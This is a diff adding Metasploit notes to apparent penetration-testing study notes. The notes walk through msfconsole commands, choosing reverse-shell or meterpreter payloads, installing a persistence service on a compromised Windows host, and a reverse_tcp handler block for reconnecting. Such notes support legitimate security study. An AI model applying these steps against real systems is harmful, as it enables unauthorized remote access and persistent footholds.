@@ -285,4 +285,28 @@ Content-length: 20
 - after this, run `wireshark` and look at the intercepted traffic
 
 #### Metasploit
+- open source framework and toolset for penetration testing and exploit development
+- gives you access to community-created exploits and attack vectors
+- extensible, can help automate your own exploits
+- uses a terminal interface to search and run exploits
+- usually used in the exploitation phase when you have already identified a potentially vulnerable resource so you can quickly load in the exploit code and run it against the target
+- open it with `msfconsole`
+- show help for all commands with `show -h`
+- find the module you want to use with `find [search term]`, which you can use to find either a named exploit, or any exploits for the software you're trying to attack
+- select an exploit with `use [exploit path]` to set it as active on your metasploit session (you can exit from an exploit with `back`)
+- see information about the exploit you selected with `info`, like platform, license, name, or a description
+- check for the necessary options with `show options`, then set each option to your target or desired configuration with `set [variable name] [desired value]`
+- select a `payload` you want to run on your target host if successful, like a reverse shell or a meterpreter session. Several options are available, see them with `show payloads`, and set the desired payload with `set payload [payload path]`
+- check your `options again`, your payload may need some specific options you have to `set`
+- run `exploit` to run your attack
+- after you gain access to a system, remember to add persistance and foothold. send your meterpreter session to `background` and execute the `exploit/windows/local/persistence_service` exploit against the background session ID
+- that installs a persistance service on the remote host, so if you ever need to reconnect to that session, run:
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [your local IP that you had when you ran the exploit]
+set LPORT [the listener por you set for the exploit]
+exploit
+```
+
 #### Meterpreter
